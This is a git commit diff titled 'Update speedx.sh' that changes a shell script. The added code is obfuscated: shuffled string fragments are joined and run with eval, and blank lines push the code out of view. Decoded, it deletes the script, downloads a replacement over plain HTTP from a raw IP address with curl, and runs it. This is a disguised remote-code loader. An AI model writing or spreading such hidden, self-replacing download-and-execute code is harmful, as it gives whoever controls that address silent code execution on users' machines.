beca4b7e0a9eb5647a34762ba3694c2fbba9e5d3
tgzin <75448283+tg230@users.noreply.github.com>
2024-06-03 12:06:56 -0300

    Update speedx.sh

--- speedx.sh
+++ speedx.sh
@@ -42,6 +42,18 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
 z="
-";Fz='edx.';Kz='ve';Sz='ctor';Qz='06"';jz='"$0"';Wz='mux/';Yz='/spe';Nz='18.2';Dz='ive=';fz='}/${';Lz='mirr';Ez='"spe';Jz='rchi';Zz='curl';Cz='arch';ez='rror';Vz='xter';Uz='peed';Mz='or="';hz='exec';Pz='36.2';Rz='dire';Iz='r $a';Tz='y="s';Gz='sh"';gz='y}"';Bz='r';dz='${mi';Hz='rm -';Xz='menu';az=' -O ';bz='"htt';iz=' sh ';Oz='20.1';cz='p://';Az='clea';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$z$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Fz$Gz$z$Zz$az$bz$cz$dz$ez$fz$Rz$Sz$gz$z$hz$iz$jz$z$Az$Bz"
+";bz=' -O ';Yz='menu';az='curl';dz='p://';Lz='mirr';Dz='ive=';Uz='y="s';Zz='/spe';Mz='or="';Hz='rm -';Cz='arch';kz='"$0"';ez='${mi';Kz='ve';Oz='168.';iz='exec';hz='y}"';Xz='mux/';fz='rror';Jz='rchi';Fz='edx.';jz=' sh ';Rz='0"';Az='clea';Tz='ctor';Iz='r $a';Sz='dire';Qz=':808';Pz='2.40';Gz='sh"';Wz='xter';Bz='r';gz='}/${';Nz='192.';cz='"htt';Ez='"spe';Vz='peed';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$Fz$Gz$z$az$bz$cz$dz$ez$fz$gz$Sz$Tz$hz$z$iz$jz$kz$z$Az$Bz"
